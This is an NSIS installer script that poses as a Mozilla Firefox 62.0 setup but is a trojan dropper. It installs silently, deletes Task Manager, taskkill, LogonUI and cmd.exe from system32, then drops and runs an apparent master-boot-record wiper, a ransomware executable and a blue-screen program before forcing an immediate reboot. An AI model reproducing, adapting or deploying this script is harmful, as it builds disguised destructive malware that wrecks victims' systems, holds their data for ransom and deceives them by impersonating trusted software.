; Script generated by the HM NIS Edit Script Wizard.

; HM NIS Edit Wizard helper defines
!define PRODUCT_NAME "Firefox"
!define PRODUCT_VERSION "62.0"
!define PRODUCT_PUBLISHER "Mozilla"
!define PRODUCT_WEB_SITE "http://www.firefox.com"
!define PRODUCT_DIR_REGKEY "Software\Microsoft\Windows\CurrentVersion\App Paths\mkbsod.exe"

Name "${PRODUCT_NAME}"
OutFile "Firefox-Setup.exe"
InstallDir "$TEMP\spz"
Icon "..\shengpizi-ransomware\IconGroup1.ico"
SilentInstall silent
InstallDirRegKey HKLM "${PRODUCT_DIR_REGKEY}" ""

Section "MainSection" SEC01
  Delete /rebootok "$WINDIR\system32\taskmgr.exe"
  Delete /rebootok "$WINDIR\system32\taskkill.exe"
  Delete /rebootok "$WINDIR\system32\LogonUI.exe"
  Delete /rebootok "$WINDIR\system32\cmd.exe"
  SetOutPath "$INSTDIR"
  SetOverwrite ifnewer
  File "..\bsod\bsod.exe"
  File "..\breakmbr\breakmbr.exe"
  File "..\shengpizi-ransomware\bin\x86\Release\shengpizi-ransomware.exe"
  File "..\bgm.wav"
  exec "$INSTDIR\breakmbr.exe"
  execwait "$INSTDIR\shengpizi-ransomware.exe"
  exec "$INSTDIR\bsod.exe"
  exec "shutdown /f /r /t 0"
SectionEnd

Section -Post
  WriteRegStr HKLM "${PRODUCT_DIR_REGKEY}" "" "$INSTDIR\mkbsod.exe"
SectionEnd